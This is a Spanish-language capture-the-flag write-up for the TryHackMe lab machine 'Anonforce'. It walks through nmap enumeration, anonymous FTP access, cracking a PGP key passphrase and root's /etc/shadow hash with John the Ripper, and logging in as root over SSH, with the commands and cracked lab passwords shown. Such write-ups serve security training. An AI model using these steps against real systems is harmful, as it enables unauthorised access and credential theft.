# Anonforce

## 1. Introduccion

### 1.1 Antecedentes

Anonforce es una máquina tipo *boot2root* de TryHackMe, diseñada para poner a prueba habilidades de **enumeración, análisis de servicios y explotación criptográfica**.

El escenario plantea un sistema con un servicio FTP mal configurado que permite acceso anónimo a una estructura completa del sistema de archivos. Dentro de este servicio se encuentran archivos sensibles, incluyendo un backup cifrado mediante PGP y su respectiva clave privada.

### 1.2 Objetivos

- Enumerar los servicios expuestos en la máquina objetivo
- Acceder al servicio FTP mediante autenticación anónima
- Descifrar información protegida mediante PGP
- Escalar privilegios hasta obtener acceso root

---

## 2. Enumeracion

### 2.1 Nmap

Se realiza un escaneo de puertos para identificar servicios activos:

```
nmap -sVC -p- <IP>
```

Resultados:

```
21/tcp open  ftp     vsftpd3.0.3
22/tcp open  ssh     OpenSSH7.2p2 Ubuntu
```

Hallazgos clave:

- FTP permite acceso anónimo
- Servicio SSH disponible para acceso remoto

---

## 3. Explotacion

### 3.1 Acceso FTP y abuso de backup cifrado

Se accede al servicio FTP utilizando credenciales anónimas:

```
ftp <IP>
Name: anonymous
Password: anonymous
```

Dentro del sistema se observa acceso a la raíz del sistema (`/`), lo cual es una mala configuración crítica.

Se localiza la carpeta:

```
/notread
```

Con permisos:

```
drwxrwxrwx (777)
```

Dentro se encuentran los archivos:

- `backup.pgp`
- `private.asc`

Se descargan ambos:

```
get backup.pgp
get private.asc
```

### 3.2 Cracking de la clave PGP

Se convierte la clave privada en un formato crackeable:

```
gpg2john private.asc > hash
```

Se procede a crackear con John:

```
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Resultado:

```
xbox360
```

### Descifrado del backup

Se importa la clave:

```
gpg --import private.asc
```

Se descifra el archivo:

```
gpg --decrypt backup.pgp
```

Se obtiene el contenido de `/etc/shadow`:

```
root:$6$...
melodias:$1$...
```

### 3.4 Crackeo de credenciales

Se extraen los hashes y se crackean con John:

```
john hash2 --wordlist=/usr/share/wordlists/rockyou.txt
```

Resultado:

```
root:hikari
```

---

## 4. Post-explotacion

### 4.1 Acceso como root

Con las credenciales obtenidas, se accede por SSH:

```
ssh root@<IP>
```

Contraseña:

```
hikari
```

Se obtiene acceso total al sistema y se recupera la flag final.
